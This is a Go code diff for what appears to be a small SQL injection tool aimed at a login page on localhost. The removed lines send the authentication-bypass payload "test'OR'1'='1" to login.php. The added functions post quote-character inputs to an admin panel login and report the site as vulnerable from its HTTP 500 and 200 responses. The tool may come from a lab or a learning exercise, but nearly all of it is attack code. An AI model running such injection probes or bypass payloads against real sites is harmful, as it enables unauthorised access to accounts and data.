@@ -13,24 +13,56 @@ type Database struct {
 	collected_data [] string
 }
 
-func main() {
-	data := url.Values {
-		"username":		{"test'OR'1'='1"},
-		"password":		{"test"},
-	};
-	
-	resp, err := http.PostForm("http://localhost:3000/login.php", data);
-
+func get_response(data url.Values) (int, string) {
+	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
 	if (err != nil) {
 		log.Fatal(err);
 	}
 
-	fmt.Println(resp.Body);
-
 	body, err := ioutil.ReadAll(resp.Body);
 	if (err != nil) {
 		log.Fatal(err);
-	}	
+	}
+	
+	return resp.StatusCode, string(body);	
+}	
 
-	fmt.Println(string(body));
+func check_sqli() bool {
+	data := url.Values {
+		"username":		{"''"},
+		"password":		{"'"},
+	};
+
+	var good bool = false;
+
+	var code int;
+	var body string;
+	code, body = get_response(data);
+
+	if (code == 500) {
+		good = true;
+	}
+
+	data = url.Values {
+		"username":		{"''"},
+		"password":		{"''"},
+	};
+
+	code, body = get_response(data);
+	if (code == 200) {
+		good = true;
+	}
+
+	if (good && (body != "")) {
+		return true;
+	}
+	return false;
+}
+
+func main() {
+	var vuln bool = check_sqli();
+
+	if (vuln == true) {
+		fmt.Println("Success");
+	}
 }
